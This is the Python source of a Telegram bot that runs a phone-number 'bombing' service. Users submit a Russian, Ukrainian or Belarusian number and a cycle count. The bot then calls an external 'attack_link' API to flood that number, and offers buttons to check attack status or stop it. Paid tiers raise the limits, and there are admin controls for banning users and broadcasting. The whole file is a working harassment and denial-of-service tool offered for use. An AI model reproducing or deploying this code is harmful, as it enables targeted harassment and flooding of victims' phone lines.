import re
import ast
import requests
from loguru import logger

from aiogram.dispatcher import FSMContext
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage

from stateHandler import STATES
from sqlHandler import SQLHandler
from configHandler import ConfigHandler
from sqlHandler.consts import TYPES, CONSTS, STRINGS

logger.add(ConfigHandler.log_file_name, format=ConfigHandler.log_format, level=ConfigHandler.log_level,
           rotation=ConfigHandler.log_rotation, compression=ConfigHandler.log_compression)
bot = Bot(token=ConfigHandler.token)
dispatcher = Dispatcher(bot, storage=MemoryStorage())

database = SQLHandler()


@logger.catch()
def api_count_check() -> list:
    country_codes = TYPES.params_list
    result = []
    for param in country_codes:
        response = requests.get(
            ConfigHandler.count_link, params=param
        ).json()
        result.append(response.get('count'))
    return result


@dispatcher.message_handler(commands=['start'])
async def start(message: types.Message):
    keyboard = [
        [
            types.KeyboardButton(TYPES.button_start),
            types.KeyboardButton(TYPES.button_services_count)
        ],
        [
            types.KeyboardButton(TYPES.button_info),
            types.KeyboardButton(TYPES.button_contact)
        ]
    ]

    if message.from_user.id in ast.literal_eval(ConfigHandler.admins):
        keyboard.append(
            [
                types.KeyboardButton(TYPES.button_change),
                types.KeyboardButton(TYPES.button_block),
                types.KeyboardButton(TYPES.button_notify)
            ]
        )

    if not database.check_user(ConfigHandler.table_name, message.from_user.id):
        database.add_user(ConfigHandler.table_name, message.from_user.first_name,
                          message.from_user.last_name, message.from_user.username, message.from_user.id)

        logger.info(STRINGS.logger_new_user_string)

    markup = types.ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

    await message.answer(STRINGS.start_string, reply_markup=markup)


@dispatcher.message_handler(content_types=['text'], state=None)
async def button_recognizer(message: types.Message):
    if database.check_block(ConfigHandler.table_name, message.from_user.id):
        await message.answer(STRINGS.ban_sting)

        logger.info(STRINGS.block_user_action)
        return

    if message.text == TYPES.button_start:
        await message.answer(STRINGS.phone_string)
        await STATES.entering_data.set()

    elif message.text == TYPES.button_services_count:
        counts = api_count_check()
        await message.answer(STRINGS.count_string.format(*counts))

    elif message.text == TYPES.button_info:
        status = database.check_user_status(ConfigHandler.table_name, message.from_user.id)
        logger.info(STRINGS.info_user_action)
        await message.answer(STRINGS.info_string.format(TYPES.naming_lambda(status),
                                                        TYPES.cycle_count_lambda(status)))

    elif message.text == TYPES.button_contact:
        await message.answer(STRINGS.contact_string)

    elif message.text == TYPES.button_change:
        await STATES.changing.set()

    elif message.text == TYPES.button_block:
        await STATES.blocking.set()

    elif message.text == TYPES.button_notify:
        await STATES.notify.set()


@dispatcher.message_handler(state=STATES.entering_data)
async def get_number(message: types.Message, state: FSMContext):
    try:
        text = message.text

        if not re.match(pattern=TYPES.ru_regex, string=text) and not \
                re.match(pattern=TYPES.uk_regex, string=text) and not \
                re.match(pattern=TYPES.by_regex, string=text):
            await message.answer(STRINGS.wrong_number_string)
            await state.reset_state(with_data=False)
            return

        await state.update_data(
            {
                'number': text
            }
        )

        await message.answer(STRINGS.cycles_count_string)
        await STATES.bombing.set()

    except (IndexError, ValueError, TypeError) as error:
        logger.warning(STRINGS.enter_phone_number_error)
        await message.answer(STRINGS.cancel_string)


@dispatcher.message_handler(state=STATES.bombing)
async def start_bombing(message: types.Message, state: FSMContext):
    try:
        count = int(message.text)

        data = await state.get_data()
        phone = data.get('number')

        for pattern in ConfigHandler.pattern_list:
            if re.match(pattern=pattern, string=phone):
                return

        if not database.check_user_status(ConfigHandler.table_name, message.from_user.id):
            count = count if count <= CONSTS.base_laps_count else CONSTS.base_laps_count
        else:
            count = count if count <= CONSTS.max_laps_count else CONSTS.max_laps_count

        response = requests.post(
            ConfigHandler.attack_link,
            json={ConfigHandler.api_number: count,
                  ConfigHandler.api_phone: phone},
        ).json()

        database.update_record(ConfigHandler.table_name, message.from_user.id, phone)

        status = response.get('success')
        identifier = response.get('id')

        await state.update_data(
            {
                'id': identifier
            }
        )

        inline_markup = types.InlineKeyboardMarkup()
        button_status = types.InlineKeyboardButton(text=TYPES.button_status, callback_data=TYPES.callback_status)
        button_stop = types.InlineKeyboardButton(text=TYPES.button_stop, callback_data=TYPES.callback_stop)
        inline_markup.add(button_status, button_stop)

        if status:
            await message.answer(STRINGS.attack_string.format(phone), reply_markup=inline_markup)
            logger.success(STRINGS.successful_attack.format(count))
        else:
            return

    except (IndexError, ValueError, TypeError) as error:
        logger.warning(STRINGS.user_input_error)
        await message.answer(STRINGS.cancel_string)

    finally:
        await state.reset_state(with_data=False)


@dispatcher.message_handler(state=STATES.changing)
async def change_subscription_status(message: types.Message, state: FSMContext):
    try:
        text = message.text.split(' ')
        database.change_status(ConfigHandler.table_name, text[CONSTS.command_first],
                               bool(int(text[CONSTS.command_second])))
        await message.answer(STRINGS.status_changed.format(text[CONSTS.command_first]))

    except (IndexError, ValueError, TypeError):
        logger.warning(STRINGS.change_status_input_error)
        await message.answer(STRINGS.cancel_string)

    finally:
        await state.reset_state(with_data=False)


@dispatcher.message_handler(state=STATES.blocking)
async def block_user(message: types.Message, state: FSMContext):
    try:
        text = message.text.split(' ')
        database.block_user(ConfigHandler.table_name, text[CONSTS.command_first])
        await message.answer(STRINGS.user_blocked.format(text[CONSTS.command_first]))

    except Exception:
        logger.warning(STRINGS.block_user_input_error)
        await message.answer(STRINGS.cancel_string)

    finally:
        await state.reset_state(with_data=False)


@dispatcher.message_handler(state=STATES.notify)
async def notify_all(message: types.Message, state: FSMContext):
    try:
        text = message.text
        data = database.get_all_ids(ConfigHandler.table_name)
        for id in data:
            try:
                await bot.send_message(id, text)
            except Exception:
                continue

    except Exception:
        logger.warning(STRINGS.block_user_input_error)
        await message.answer(STRINGS.cancel_string)

    finally:
        await state.reset_state(with_data=False)


@dispatcher.callback_query_handler(lambda call: True)
async def inline_handling(callback_query: types.CallbackQuery, state: FSMContext):
    chat_id = callback_query.message.chat.id

    if callback_query.data == TYPES.callback_status:
        id = await state.get_data()
        id = id.get('id')

        response = requests.get(ConfigHandler.attack_status_link.format(id)).json()
        sent, end = response.get('currently_at'), response.get('end_at')

        await bot.send_message(chat_id, STRINGS.messages_string.format((end - sent) // 5))

    elif callback_query.data == TYPES.callback_stop:
        id = await state.get_data()
        id = id.get('id')

        requests.post(ConfigHandler.attack_stop_link.format(id)).json()

        await bot.edit_message_text(chat_id=chat_id, message_id=callback_query.message.message_id,
                                    text=STRINGS.attack_stopped)


@logger.catch()
def main():
    executor.start_polling(dispatcher, skip_updates=True)


if __name__ == '__main__':
    try:
        main()
    except Exception:
        logger.critical(STRINGS.start_bot_error)
